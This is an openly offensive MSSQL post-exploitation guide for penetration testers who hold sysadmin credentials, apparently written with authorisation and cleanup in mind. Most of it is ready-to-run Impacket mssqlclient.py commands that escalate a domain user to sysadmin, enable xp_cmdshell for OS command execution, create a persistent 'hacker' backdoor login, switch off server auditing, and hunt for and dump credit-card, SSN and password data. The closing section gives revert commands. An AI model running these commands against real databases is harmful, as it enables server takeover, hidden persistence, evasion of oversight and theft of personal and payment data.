# 🔐 MSSQL Sysadmin – Complete Post-Exploitation & Cleanup Guide

## Overview
This guide covers everything from **checking permissions** and **gaining sysadmin** to **post‑exploitation** and **full cleanup**. It is designed for penetration testers who have obtained `sa` or sysadmin credentials and need to responsibly test, document, and revert changes.

> ⚠️ **Important:** Only perform these actions **with explicit client authorisation**. All changes must be documented and **fully reverted** before the engagement ends.

---

## 📋 Prerequisites
- Valid `sa` or sysadmin credentials.
- `mssqlclient.py` from Impacket (or any SQL client).
- Domain or SQL user you want to test (e.g., `DOMAIN\username`).

---

## 📌 Table of Contents
1. [Check Current Permissions](#1️⃣-check-current-permissions)
2. [If the User Is Already Sysadmin – Skip to Step 5](#2️⃣-if-the-user-is-already-sysadmin-–-skip-to-step-5)
3. [Add Domain User as sysadmin (Test Only)](#3️⃣-add-domain-user-as-sysadmin-test-only)
4. [What You Can Do With Sysadmin](#4️⃣-what-you-can-do-with-sysadmin)
5. [Post-Exploitation Commands & Examples](#5️⃣-post-exploitation-commands--examples)
6. [Revert Changes (Cleanup)](#6️⃣-revert-changes-cleanup)
7. [⚠️ CRITICAL REMINDER](#-critical-reminder-dont-forget-to-revert-in-production-environments)

---

## 1️⃣ Check Current Permissions

Before making any changes, verify if the domain user already has `sysadmin` privileges.

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "SELECT IS_SRVROLEMEMBER('sysadmin', 'DOMAIN\\username') AS IsSysAdmin"
```

**Expected output:**
- `1` → User is already sysadmin.
- `0` or `NULL` → User is not sysadmin.

---

## 2️⃣ If the User Is Already Sysadmin – Skip to Step 5

If the query above returns `1`, the user already has `sysadmin` privileges.  
**You do not need to add them again.**  

👉 **Jump directly to:** [What You Can Do With Sysadmin](#4️⃣-what-you-can-do-with-sysadmin)  
or  
👉 **Proceed to cleanup:** [Revert Changes (Cleanup)](#6️⃣-revert-changes-cleanup)

---

## 3️⃣ Add Domain User as sysadmin (Test Only)

**Only perform this step if the user is NOT already sysadmin** (i.e., the check returned `0` or `NULL`).

This command:
- Creates a server login for the domain user (if not already present).
- Adds the user to the `sysadmin` server role.

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "CREATE LOGIN [DOMAIN\\username] FROM WINDOWS; ALTER SERVER ROLE sysadmin ADD MEMBER [DOMAIN\\username];"
```

**Verify the change:**

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "SELECT IS_SRVROLEMEMBER('sysadmin', 'DOMAIN\\username') AS IsSysAdmin"
```

Now it should return `1`.

---

## 4️⃣ What You Can Do With Sysadmin

| Capability | Description |
|------------|-------------|
| **Enable `xp_cmdshell`** | Execute operating system commands directly from SQL. |
| **Read/write files** | Use `xp_cmdshell` or `BULK INSERT` / `OPENROWSET` to read/write files on the server. |
| **Access all databases** | Read, modify, or delete any database, including system databases (`master`, `msdb`). |
| **Create/alter logins** | Add new SQL logins or Windows logins and grant them any permission. |
| **Change server configuration** | Modify advanced settings (e.g., enable `xp_cmdshell`, change memory limits). |
| **Backup/restore databases** | Dump all databases to `.bak` files. |
| **Query linked servers** | Access other databases via linked servers (lateral movement). |
| **Disable or tamper with auditing** | Stop or alter audit specifications. |
| **Run arbitrary .NET code (CLR)** | Create and execute unsafe CLR assemblies (if enabled). |
| **Create persistent backdoor accounts** | Add new hidden logins for future access. |
| **Query sensitive data** | Read credit card numbers, PII, credentials, etc. |
| **Execute OS commands as SYSTEM** | If SQL Server runs as `NT AUTHORITY\SYSTEM`, you get full system access. |

---

## 5️⃣ Post-Exploitation Commands & Examples

All commands assume you are already authenticated as `sysadmin`.

### 🔹 5.1 Enable `xp_cmdshell` (OS Command Execution)

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
```

### 🔹 5.2 Execute OS Commands

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC xp_cmdshell 'whoami'"
```

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC xp_cmdshell 'ipconfig /all'"
```

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC xp_cmdshell 'dir C:\\'"
```

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC xp_cmdshell 'net user'"
```

### 🔹 5.3 Read a File from the Server

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "CREATE TABLE #tmp (line VARCHAR(8000)); BULK INSERT #tmp FROM 'C:\\temp\\file.txt' WITH (DATAFILETYPE = 'char', ROWTERMINATOR = '\\n'); SELECT TOP 10 * FROM #tmp; DROP TABLE #tmp"
```

### 🔹 5.4 Write a File to the Server

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC xp_cmdshell 'echo Hello World > C:\\temp\\test.txt'"
```

### 🔹 5.5 List All Databases

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "SELECT name, database_id, create_date FROM sys.databases ORDER BY name"
```

### 🔹 5.6 Query Linked Servers (Lateral Movement)

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "SELECT name, data_source, provider_string FROM sys.servers WHERE is_linked = 1"
```

### 🔹 5.7 Backup a Database

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "BACKUP DATABASE MyDB TO DISK = 'C:\\backups\\MyDB.bak'"
```

### 🔹 5.8 Create a New Sysadmin Login (Persistence)

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "CREATE LOGIN [hacker] WITH PASSWORD = 'H@ck3r123!'; ALTER SERVER ROLE sysadmin ADD MEMBER [hacker]"
```

### 🔹 5.9 Check Current Audit Configuration

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "SELECT name, is_state_enabled FROM sys.server_audits"
```

### 🔹 5.10 Disable Auditing (if needed)

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "ALTER SERVER AUDIT [AuditName] WITH (STATE = OFF)"
```

### 🔹 5.11 Find Sensitive Tables (Credit Cards, PII)

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "USE MyDatabase; SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%card%' OR COLUMN_NAME LIKE '%credit%' OR COLUMN_NAME LIKE '%ssn%' OR COLUMN_NAME LIKE '%password%'"
```

### 🔹 5.12 Read Sensitive Data (Sample)

```bash
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "USE MyDatabase; SELECT TOP 10 * FROM dbo.Users"
```

---

## 6️⃣ Revert Changes (Cleanup)

If you made any **permanent** changes during the test – such as enabling `xp_cmdshell`, creating new logins, or modifying configurations – you must revert them **before** concluding the engagement.

### ✅ Revert Checklist

| Change | Revert Command |
|--------|----------------|
| **Enable `xp_cmdshell`** | `EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;` |
| **Create a new sysadmin login** | `DROP LOGIN [hacker];` |
| **Backup files** | Delete any `.bak` files created: `EXEC xp_cmdshell 'del C:\backups\*.bak'` |
| **Disable auditing** | `ALTER SERVER AUDIT [AuditName] WITH (STATE = ON);` |
| **Add domain user to sysadmin** | `ALTER SERVER ROLE sysadmin DROP MEMBER [DOMAIN\username]; DROP LOGIN [DOMAIN\username];` |
| **Add SQL user to sysadmin** | `ALTER SERVER ROLE sysadmin DROP MEMBER [username]; DROP LOGIN [username];` |

---

### 🔧 Full Revert Example

```bash
# Disable xp_cmdshell
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"

# Remove any test logins
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "DROP LOGIN [hacker]"

# Remove domain user from sysadmin (if you added one)
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "ALTER SERVER ROLE sysadmin DROP MEMBER [DOMAIN\\testuser]; DROP LOGIN [DOMAIN\\testuser];"

# Delete backup files (if created)
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC xp_cmdshell 'del C:\\backups\\* /Q'"
```

---

### 🔍 Verify Everything Is Reverted

```bash
# Check if xp_cmdshell is disabled
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "EXEC sp_configure 'xp_cmdshell'"
# run_value should be 0

# Check if test login exists
mssqlclient.py USERNAME:'PASSWORD'@TARGET_IP -c "SELECT name FROM sys.server_principals WHERE name IN ('hacker', 'DOMAIN\\testuser')"
# Should return 0 rows
```

---

## ⚠️ CRITICAL REMINDER

> **🚨 DON'T FORGET TO REVERT IN PRODUCTION ENVIRONMENTS 🚨**
>
> Every change you make **must** be documented and **fully reverted** before the engagement ends.
>
> - **Do not leave test accounts active.**
> - **Do not leave `xp_cmdshell` enabled unless it was already enabled.**
> - **Do not leave backup files or logs on the server.**
> - **Do not leave audit settings disabled.**
> - **Do not leave any persistence mechanisms.**
>
> **If you are unsure** whether a change existed before, check with the client or use the `create_date` in `sys.server_principals` to confirm which logins were newly created.

---

## 📚 References

- [Impacket mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py)
- [Microsoft Docs – xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)
- [Microsoft Docs – Server Roles](https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles)
- [Microsoft Docs – sp_configure](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-the-xp-cmdshell-server-configuration-option)

---

**Happy (and responsible) testing!** 🚀  
**And always – clean up after yourself.**
